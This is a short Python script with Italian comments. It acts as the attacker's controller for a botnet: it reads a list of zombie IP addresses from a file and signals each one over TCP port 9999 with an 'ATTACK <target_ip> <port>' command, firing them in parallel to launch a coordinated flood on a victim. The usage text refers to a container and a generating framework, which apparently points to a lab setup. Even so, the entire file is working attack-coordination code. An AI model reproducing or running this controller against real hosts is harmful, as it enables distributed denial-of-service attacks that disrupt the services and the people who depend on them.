#!/usr/bin/env python3
import socket
import sys
import threading
import os

ZOMBIE_PORT = 9999
LISTA_ZOMBIE_PATH = "/zombies.txt"

def invia_comando_target(zombie_ip, target_ip, target_port):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(4)
        s.connect((zombie_ip, ZOMBIE_PORT))
        
        # Invia l'istruzione di attacco allo zombie agent
        comando = f"ATTACK {target_ip} {target_port}\n"
        s.sendall(comando.encode())
        print(f"[+] Segnale di attacco inviato allo Zombie IP: {zombie_ip}")
        s.close()
    except Exception as e:
        print(f"[-] Errore di connessione con lo Zombie {zombie_ip}: {e}")

def main():
    if len(sys.argv) < 3:
        print("Uso dentro il container: python3 /attacker.py <IP_VITTIMA> <PORTA_VITTIMA>")
        sys.exit(1)
        
    target_ip = sys.argv[1]
    target_port = sys.argv[2]

    # Verifica se il file degli zombie generato dal framework esiste
    if not os.path.exists(LISTA_ZOMBIE_PATH):
        print(f"[-] Errore: File {LISTA_ZOMBIE_PATH} non trovato. Il generatore ha fallito?")
        sys.exit(1)

    # Legge dinamicamente gli IP degli zombie rilevati dal nome del container
    with open(LISTA_ZOMBIE_PATH, "r") as f:
        zombies = [line.strip() for line in f if line.strip()]

    if not zombies:
        print("[-] Nessuno zombie trovato nel file della botnet.")
        sys.exit(1)

    print(f"[*] Rilevati {len(zombies)} zombie attivi tramite il file di configurazione.")
    print(f"[*] Lancio dell'attacco coordinato contro {target_ip}:{target_port}...")

    threads = []
    for ip in zombies:
        t = threading.Thread(target=invia_comando_target, args=(ip, target_ip, target_port))
        threads.append(t)
        t.start()

    for t in threads:
        t.join()

    print("[*] Operazione completata dal terminale dell'attaccante.")

if __name__ == "__main__":
    main()